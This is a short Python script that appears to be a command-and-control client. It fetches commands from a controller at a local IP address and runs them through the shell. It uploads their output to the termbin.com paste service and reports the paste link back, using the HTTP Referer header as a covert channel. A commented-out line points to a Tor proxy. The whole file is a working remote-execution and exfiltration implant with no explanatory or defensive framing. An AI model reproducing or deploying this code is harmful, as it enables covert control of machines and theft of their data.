#!/usr/bin/python3

from subprocess import Popen, PIPE, STDOUT
import requests
import re
import socket
import time


cmd_url_order = 'http://192.168.1.64:5000/'
cmd_url_answer = 'http://192.168.1.64:5000/answer'
hostname = socket.gethostname()
hostname_pattern = 'host:%s-00' % hostname
headers = {}
referer = {'Referer': hostname_pattern}
cache_control = {'Cache-Control': 'no-cache'}
headers.update(referer)
headers.update(cache_control)
check_cmd_1 = ''


def get_cmd():
    req = requests.get(cmd_url_order, headers=headers).content.decode().strip()
    if req == '':
        print("bruh")
    else:
        return req

supercmd = get_cmd()



def run_cmd(cmd):
	cmd_split = cmd.split('--')
	if cmd_split[1] == hostname:
		cmd = cmd_split[2]
		print(cmd)
		run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()
		out = run.stdout.read()
		if not out:
			out = b'ok'
		
		# termbin_cnx = socks.socksocket()
		termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)
		
		termbin_cnx.connect(('termbin.com', 9999))
		termbin_cnx.send(out)
		recv = termbin_cnx.recv(100000)
		termbin_url_created = recv.decode().rstrip('\x00').strip()

		# termbin_url_created = "https://termbin.com/ez9r"

		print(termbin_url_created)
		termbin_header = {'Referer': hostname_pattern+" -- "+termbin_url_created}
		headers.update(termbin_header)
		try:
			push = requests.get(cmd_url_answer, headers=headers)
			print('executed')
			headers.update(referer)
		except Exception as e:
			print(e)
			pass
	else:
		print('not for me')


run_cmd(supercmd)